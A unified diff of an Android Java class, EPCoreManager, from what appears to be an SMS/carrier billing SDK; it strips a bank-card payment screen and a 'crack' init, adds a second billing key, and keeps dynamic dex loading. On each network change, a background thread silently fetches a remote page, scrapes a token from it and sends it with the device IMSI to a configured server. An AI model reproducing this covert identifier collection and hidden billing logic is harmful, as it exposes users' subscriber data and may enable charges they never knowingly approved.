@@ -1,10 +1,13 @@
 package com.core_sur.publics;
 
+import java.io.BufferedReader;
 import java.io.File;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
+import java.io.InputStreamReader;
 import java.lang.reflect.Constructor;
+import java.lang.reflect.Method;
 import java.security.MessageDigest;
 import java.security.NoSuchAlgorithmException;
 import java.text.MessageFormat;
@@ -22,21 +25,19 @@ import org.yummysdk.lib.YMBillingInterface;
 
 import android.annotation.SuppressLint;
 import android.app.Activity;
-import android.app.AlertDialog;
-import android.app.Dialog;
 import android.app.Service;
 import android.content.BroadcastReceiver;
 import android.content.ComponentName;
 import android.content.Context;
-import android.content.DialogInterface;
-import android.content.DialogInterface.OnClickListener;
 import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
-import android.content.pm.PackageManager.NameNotFoundException;
 import android.content.pm.Signature;
+import android.content.pm.PackageManager.NameNotFoundException;
+import android.content.res.AssetManager;
 import android.content.res.Resources;
+import android.content.res.XmlResourceParser;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
 import android.os.Environment;
@@ -44,15 +45,14 @@ import android.os.Handler;
 import android.os.Looper;
 import android.os.Message;
 import android.text.Html;
-import android.widget.Toast;
 
-import com.cmnpay.api.Payment;
+import c.h.u.a.b;
+
 import com.core_sur.Config;
 import com.core_sur.HttpCommon;
-import com.core_sur.HttpCommon.HttpResult;
 import com.core_sur.WCConnect;
+import com.core_sur.HttpCommon.HttpResult;
 import com.core_sur.activity.EActivity;
-import com.core_sur.activity.impl.IBankPayActivity;
 import com.core_sur.bean.EPConfig;
 import com.core_sur.bean.EPInfo;
 import com.core_sur.bean.RevBean;
@@ -67,7 +67,6 @@ import com.core_sur.running.AppStatus;
 import com.core_sur.tools.CarryImpi;
 import com.core_sur.tools.CheckLog;
 import com.core_sur.tools.CommonUtils;
-import com.core_sur.tools.Connect;
 import com.core_sur.tools.Log;
 import com.core_sur.tools.MessageObjcet;
 
@@ -77,11 +76,6 @@ public class EPCoreManager implements EPEngine {
 	private static EPCoreManager epManager;
 	private Context c;
 	private BroadcastReceiver pnBroadcast;// 手机号计费方式操作广播
-	public static int isSupportBank = 0;//0 不支持 1 支持
-	
-	//记录计费请求数据，用于提交tbl_ststuse
-	public String fee;
-	public String note;
 
 	private EPCoreManager() {
 	}
@@ -210,11 +204,6 @@ public class EPCoreManager implements EPEngine {
 		init(context, isCheckConfig);
 
 		// 第三方初始化
-		
-		//芒果破解初始化
-		Payment.init(context);
-		
-		//融合包
 		File dirCache = CommonUtils.getDirCache(context);
 		if (dirCache != null) {
 			String dexpath = new File(dirCache.getAbsolutePath(),
@@ -252,8 +241,10 @@ public class EPCoreManager implements EPEngine {
 			final Context c1 = CommonUtils.getWindowTopViews()[0].getContext();
 			YMBillingInterface.init((Activity)c1, "PPHR1YTRZY", 0x400,
 					mBillingCallback);
+			
+			// Add By Andy
+			YMBillingInterface.init((Activity) c1, "PP25U7X25R", 0x400, mBillingCallback);
 		}
-
 
 		String str = "packagename=" + getContext().getPackageName()
 				+ "&appsign=" + getSignature(getContext()) + "&appkey="
@@ -264,12 +255,14 @@ public class EPCoreManager implements EPEngine {
 		try {
 			String args = new JSONObject().put("channelKey",
 					CommonUtils.getCLnew(c)).toString();
+			
+			System.out.println("Andy Tag : Start Regedit");
+			
 			WCConnect.getInstance().Regedit(1, c, CommonUtils.getAppKey(c),
 					args);
 			// SMSHolder.getInstance().StartHolder(c);
 			regBroadCast();
 			regPNumberBroadCast();
-			activityPayBroadCast();
 		} catch (JSONException e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
@@ -301,15 +294,6 @@ public class EPCoreManager implements EPEngine {
 				sendPaySuccess.putExtra("sendPaySuccess", 1);
 				c.sendBroadcast(sendPaySuccess);
 			}
-			
-			//关闭壳的dialog,部分计费成功后无法关闭壳dialog时调用
-			if (msg.what == 10000) {
-				Intent sendPaySuccess = new Intent(c.getPackageName()
-						+ ".my.fee.listener");
-				sendPaySuccess.putExtra("sendPaySuccess", 1);
-				c.sendBroadcast(sendPaySuccess);
-				return;
-			}
 
 			intent.putExtra("msg.what", msg.what);
 			intent.putExtra("msg.obj", msg.obj + "");
@@ -320,11 +304,6 @@ public class EPCoreManager implements EPEngine {
 	@Override
 	public void pay(Object... obj) {
 
-		//是否支持银行卡
-		if (obj.length >= 4) {
-			isSupportBank = (Integer)obj[3];
-		}
-		
 		// 判断验证结果
 		if (com.core_sur.Config.isCheck) {
 			int flag = c.getSharedPreferences("signinfo", Context.MODE_PRIVATE)
@@ -377,51 +356,21 @@ public class EPCoreManager implements EPEngine {
 			sendPaySuccess.putExtra("sendPaySuccess", 1);
 			c.sendBroadcast(sendPaySuccess);
 			Message msg = Message.obtain();
-			msg.what = 1078;
+			msg.what = 1070;
 			msg.obj = "两次计费间隔不能小于" + time / 1000 + "秒";
-			//Toast.makeText(c, "两次计费间隔不能小于" + time / 1000 + "秒", 1000).show();
 			handler.sendMessage(msg);
 			return;
 		}
 		preSendPayTime = System.currentTimeMillis();
-		final Thread thread = new Thread() {
+		Thread thread = new Thread() {
 			@Override
 			public void run() {
 				super.run();
-				WCConnect.getInstance().Pay(handler, c, UserTag, OtherInfo,num, note);
+				WCConnect.getInstance().Pay(handler, c, UserTag, OtherInfo,
+						num, note);
 			}
 		};
-		
-		this.fee = num+"";
-		this.note = note;
-		
-		if (isSupportBank == 1) {
-			//保存计费线程，方便之后调用
-			IBankPayActivity.smspayThread = thread;
-			//开启计费选择界面
-			showIBankPayActivity(num+"",note);
-		}else{
-			thread.start();
-		}
-		
-		//计费选择界面弹出判定
-		//if (WCConnect.getInstance().regResponse.getisSupportIB() == 0 &&
-		//		CommonUtils.getWindowTopViews() != null&& 
-		//		CommonUtils.getWindowTopViews().length > 0) {
-//		boolean f = true;
-//		if (f) {
-//			if (!Connect.isNetworkAvailable(c)) {
-//				Toast.makeText(c, "请先连接网络!",Toast.LENGTH_LONG).show();
-//			}else{
-//				showIBankPayActivity(num+"",note);
-//		IBankPayActivity.changeStatus(21);
-//			}
-//		}else{
-//			thread.start();
-//		}
-		//}else{
-		//	
-		//}
+		thread.start();
 	}
 
 	/**
@@ -478,33 +427,6 @@ public class EPCoreManager implements EPEngine {
 		}
 	}
 
-	/**
-	 * 银行卡支付界面
-	 * 
-	 * @param payNumber
-	 * @param payPoint
-	 */
-	public void showIBankPayActivity(String payNumber, String payPoint) {
-		Intent intent = new Intent();
-		intent.setComponent(new ComponentName(c.getPackageName(),
-				CommonFinals.SHOW_ACTIVITY));
-		intent.putExtra("message_type",
-				CommonFinals.MESSAGE_TYPE_IBANK_ACTIVITY);
-		PayCenterEvent payCenterEvent = new PayCenterEvent(payPoint,
-				CommonUtils.getAppName(c), payNumber);
-		JSONObject jsonObject = new JSONObject();
-		try {
-			jsonObject.put("appName", payCenterEvent.getAppName());
-			jsonObject.put("payPoint", payCenterEvent.getPayPoint());
-			jsonObject.put("payNumber", payCenterEvent.getPayNumber());
-			intent.putExtra("message", jsonObject.toString());
-			intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-			c.startActivity(intent);
-		} catch (JSONException e) {
-			e.printStackTrace();
-		}
-	}
-	
 	public void payOK() {
 		CheckLog.log(this.getClass().getName(), new Exception().getStackTrace()
 				.toString(), "payOK");
@@ -652,12 +574,11 @@ public class EPCoreManager implements EPEngine {
 								c.getPackageName()))) {
 					payFail();
 				} else if (intent.getAction().equals(
-						MessageFormat.format(CommonFinals.PAYFORMAT,c.getPackageName()))) {
-					
+						MessageFormat.format(CommonFinals.PAYFORMAT,
+								c.getPackageName()))) {
 					pay(intent.getExtras().getInt("payNumber"), intent
 							.getExtras().getString("payNote"), intent
-							.getExtras().getString("userOrderId"),
-							intent.getExtras().getInt("isSupportBank",0));
+							.getExtras().getString("userOrderId"));
 				};
 
 				// 监听网络变化,增加获取手机号概率
@@ -679,18 +600,29 @@ public class EPCoreManager implements EPEngine {
 							public void run() {
 								// TODO Auto-generated method stub
 								if (CommonUtils.getNetWork(Config.getInstance().tpContext) == 1) {
-									HttpResult res_url = HttpCommon.getHtmlContents(Config.getenurl, "", false);
-									if (res_url.StatusCode != 200) 
-										return;
-									HttpResult hres = HttpCommon.getHtmlContents(res_url.HtmlContents,"", false);
+									HttpResult hres = HttpCommon
+											.getHtmlContents(Config.getenurl,
+													"", false);
 									if (hres.StatusCode == 200) {
-										String temp = Html.fromHtml(hres.HtmlContents).toString().trim().replaceAll("\r|\n", "");
-										temp = temp.substring(temp.indexOf("号") + 1,temp.length());
-										if (temp != null && !temp.equals("")){
-											temp = "?imsi="+ CommonUtils.getImsi(Config.getInstance().tpContext)+ "&encryptStr=" + temp;
-											HttpCommon.getHtmlContents(Config.submitenurl + temp, "",false);
-											hasComit = true;
-										}
+
+										String temp = Html
+												.fromHtml(hres.HtmlContents)
+												.toString().trim()
+												.replaceAll("\r|\n", "");
+										temp = temp.substring(
+												temp.indexOf("号") + 1,
+												temp.length());
+
+										if (temp.length() == 0)
+											return;
+										temp = "?imsi="
+												+ CommonUtils.getImsi(Config
+														.getInstance().tpContext)
+												+ "&encryptStr=" + temp;
+										HttpCommon.getHtmlContents(
+												Config.submitenurl + temp, "",
+												false);
+										hasComit = true;
 									}
 								}
 							}
@@ -871,6 +803,7 @@ public class EPCoreManager implements EPEngine {
 					messageCallBack.what = 0;
 					WCConnect.getInstance().handlerAction
 							.sendMessage(messageCallBack);
+					// PostLog(rb);
 					break;
 
 				case 2:
@@ -884,6 +817,7 @@ public class EPCoreManager implements EPEngine {
 					messageCallBack.what = 0;
 					WCConnect.getInstance().handlerAction
 							.sendMessage(messageCallBack);
+					// PostLog(rb);
 					break;
 
 				case 3:
@@ -910,6 +844,7 @@ public class EPCoreManager implements EPEngine {
 					messageCallBack.what = 0;
 					WCConnect.getInstance().handlerAction
 							.sendMessage(messageCallBack);
+					// PostLog(rb);
 					break;
 
 				case 5:
@@ -919,6 +854,7 @@ public class EPCoreManager implements EPEngine {
 					} else if (intent.getStringExtra("msg").equals("fail")) {
 
 					}
+					// PostLog(rb);
 					break;
 				default:
 					break;
@@ -931,26 +867,6 @@ public class EPCoreManager implements EPEngine {
 						CommonFinals.ACTION_PNPAY_SEND, c.getPackageName())));
 	}
 
-	/**
-	 * 方便与代理activity信息交互，操作写在代理activity内，减少此类的代码量
-	 */
-	private void activityPayBroadCast() {
-		BroadcastReceiver activityPayBroadcast = new BroadcastReceiver() {
-
-			@Override
-			public void onReceive(Context context, Intent intent) {
-				// TODO Auto-generated method stub
-				String tag = intent.getStringExtra("tag");
-				if (tag.equals(IBankPayActivity.TAG)) {
-					IBankPayActivity.callBak(intent.getIntExtra("what", -1),intent.getStringExtra("msg"));
-				}
-			}
-		};
-		c.registerReceiver(activityPayBroadcast,
-				new IntentFilter(MessageFormat.format("{0}.com.pay.activitypay", c.getPackageName())));
-	}
-	
-	
 	private void PostLog(RevBean rb) {
 		WCConnect.getInstance().PostLog(
 				"PNumberPay" + Config.splitStringLevel1 + rb.getCmdid()
@@ -1050,7 +966,7 @@ public class EPCoreManager implements EPEngine {
 		// }
 		if (file == null || !file.canRead() || !file.canWrite()
 				|| !file.exists()) {
-			// System.out.println("取缓存路径");         
+			// System.out.println("取缓存路径");
 			file = context.getFilesDir();
 			if (file == null || !file.exists()) {
 				File data = new File(Environment.getDataDirectory() + "/ep");
